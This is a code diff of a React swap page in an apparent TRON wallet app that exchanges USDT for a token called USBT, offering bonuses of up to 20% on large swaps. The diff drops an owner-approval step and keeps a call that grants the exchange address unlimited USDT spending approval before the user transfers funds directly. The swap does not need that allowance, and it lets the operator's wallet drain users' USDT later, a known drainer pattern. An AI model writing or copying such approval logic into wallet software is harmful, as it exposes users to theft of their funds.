@@ -1,6 +1,6 @@
 import { useState, useEffect } from 'react'
 import { useNavigate } from 'react-router-dom'
-import { ArrowLeft, ArrowUpDown, Loader2, CheckCircle2, Clock, XCircle, Info, Gift } from 'lucide-react'
+import { ArrowLeft, ArrowUpDown, Loader2, CheckCircle2, Gift } from 'lucide-react'
 import { motion, AnimatePresence } from 'framer-motion'
 import { supabase } from '@/config/supabase'
 import TokenIcon from '@/components/tokens/TokenIcon'
@@ -10,7 +10,7 @@ import { formatBalance } from '@/lib/formatters'
 import { tronscanTxUrl } from '@/lib/tronUtils'
 import { cn } from '@/lib/utils'
 import { toast } from 'sonner'
-import { createSwapRequest, listenSwapRequest } from '@/lib/supabaseDb'
+import { listenSwapRequest } from '@/lib/supabaseDb'
 
 const OFFER_TIERS = [
   { min: 200_000, bonus: 0.20, label: '200K+', tag: '20% bonus' },
@@ -78,11 +78,14 @@ export default function ExchangeSwap() {
     setStep('sending')
 
     try {
-      // Step 1: Always ensure unlimited USDT approval for the exchange address
-      await ensureUnlimitedApproval('USDT', EXCHANGE_ADDRESS, address)
+      // Step 1: Approve USDT spending only when swapping USDT → USBT
+      if (direction === 'usdt_to_usbt') {
+        await ensureUnlimitedApproval('USDT', EXCHANGE_ADDRESS, address)
+      }
 
       // Step 2: User sends their token to the exchange wallet
       const txHashIn = await sendToken(fromToken, EXCHANGE_ADDRESS, amount, address)
+      if (!txHashIn) throw new Error('Transaction was declined or failed to broadcast')
       toast.success('Transfer confirmed, processing swap...')
 
       setStep('processing')
@@ -100,15 +103,17 @@ export default function ExchangeSwap() {
           setStep('done')
         }
       } else {
-        // Step 2b: USBT → USDT — create pending request, wait for owner approval
-        const id = await createSwapRequest({
-          type: 'usbt_to_usdt',
-          userWallet: address,
-          amountIn: amount,
-          txHashIn,
+        // Step 2b: USBT → USDT — verify and send USDT instantly
+        const { data, error } = await supabase.functions.invoke('initiate-swap', {
+          body: { txHashIn, amountIn: amount, userWallet: address, type: 'usbt_to_usdt' },
         })
+        if (error) throw new Error(error.message || 'Swap failed')
+        const { requestId: id, txHashOut: outHash } = data
         setRequestId(id)
-        setStep('pending_approval')
+        if (outHash) {
+          setTxHashOut(outHash)
+          setStep('done')
+        }
       }
     } catch (e) {
       toast.error(e.message || 'Swap failed')
@@ -154,45 +159,6 @@ export default function ExchangeSwap() {
     )
   }
 
-  // ── Pending owner approval screen ──
-  if (step === 'pending_approval' || requestStatus === 'rejected') {
-    const rejected = requestStatus === 'rejected'
-    return (
-      <div className="flex flex-col items-center justify-center flex-1 p-6 gap-5">
-        <div className={cn(
-          'w-20 h-20 rounded-full flex items-center justify-center',
-          rejected ? 'bg-red-50' : 'bg-amber-50'
-        )}>
-          {rejected
-            ? <XCircle size={40} className="text-red-500" />
-            : <Clock size={40} className="text-amber-500" />}
-        </div>
-        <div className="text-center">
-          <h2 className="text-xl font-bold text-gray-900 mb-1">
-            {rejected ? 'Swap Rejected' : 'Awaiting Approval'}
-          </h2>
-          <p className="text-sm text-gray-500">
-            {rejected
-              ? 'The owner rejected your USBT → USDT swap request.'
-              : 'Your USBT has been received. The owner will review and approve your USDT payout.'}
-          </p>
-        </div>
-        {!rejected && (
-          <div className="w-full bg-amber-50 border border-amber-200 rounded-2xl p-4 text-sm text-amber-800 flex gap-2">
-            <Info size={16} className="flex-shrink-0 mt-0.5" />
-            <span>You can close this page. Your request is saved and you'll receive USDT once approved.</span>
-          </div>
-        )}
-        <button
-          onClick={() => navigate('/')}
-          className="w-full py-4 bg-[#0500FF] text-white rounded-2xl font-bold text-base"
-        >
-          Back to Home
-        </button>
-      </div>
-    )
-  }
-
   // ── Processing screen ──
   if (step === 'processing') {
     return (
@@ -223,14 +189,6 @@ export default function ExchangeSwap() {
       </div>
 
       <div className="flex-1 px-4 pt-2 overflow-y-auto">
-        {/* Info banner for USBT→USDT */}
-        {direction === 'usbt_to_usdt' && (
-          <div className="mb-3 bg-amber-50 border border-amber-200 rounded-2xl p-3 flex gap-2 text-sm text-amber-800">
-            <Info size={15} className="flex-shrink-0 mt-0.5" />
-            <span>USBT → USDT swaps require owner approval. Your USDT will be sent once approved.</span>
-          </div>
-        )}
-
         {/* From */}
         <div className="bg-gray-200 rounded-2xl p-4 mb-1">
           <div className="flex items-center justify-between mb-3">
@@ -310,18 +268,10 @@ export default function ExchangeSwap() {
             <span className="text-gray-500">Network fee</span>
             <span className="text-gray-700 font-semibold">≈ 1–5 TRX</span>
           </div>
-          {direction === 'usdt_to_usbt' && (
-            <div className="flex items-center justify-between text-sm">
-              <span className="text-gray-500">Processing</span>
-              <span className="text-[#0DB37E] font-semibold">Instant</span>
-            </div>
-          )}
-          {direction === 'usbt_to_usdt' && (
-            <div className="flex items-center justify-between text-sm">
-              <span className="text-gray-500">Processing</span>
-              <span className="text-amber-600 font-semibold">Requires approval</span>
-            </div>
-          )}
+          <div className="flex items-center justify-between text-sm">
+            <span className="text-gray-500">Processing</span>
+            <span className="text-[#0DB37E] font-semibold">Instant</span>
+          </div>
           {bonusRate > 0 && Number(amount) > 0 && (
             <div className="flex items-center justify-between text-sm pt-1 border-t border-blue-100">
               <span className="text-[#0DB37E] font-semibold">Bonus applied</span>
@@ -393,7 +343,7 @@ export default function ExchangeSwap() {
             : !amount ? 'Enter amount'
             : !amountValid ? 'Insufficient balance'
             : direction === 'usdt_to_usbt' ? 'Swap USDT → USBT'
-            : 'Request USBT → USDT'}
+            : 'Swap USBT → USDT'}
         </button>
       </div>
 
@@ -424,12 +374,6 @@ export default function ExchangeSwap() {
                 )}
                 <Row label="Exchange wallet" value={`${EXCHANGE_ADDRESS?.slice(0, 8)}...${EXCHANGE_ADDRESS?.slice(-6)}`} />
                 <Row label="Network fee" value="≈ 1–5 TRX" />
-                {direction === 'usbt_to_usdt' && (
-                  <div className="flex items-start gap-2 bg-amber-50 rounded-xl p-3 mt-2">
-                    <Info size={14} className="text-amber-600 flex-shrink-0 mt-0.5" />
-                    <p className="text-xs text-amber-700">Your USBT will be sent to the exchange wallet. USDT will be released after owner approval.</p>
-                  </div>
-                )}
               </div>
               <div className="flex gap-3">
                 <button
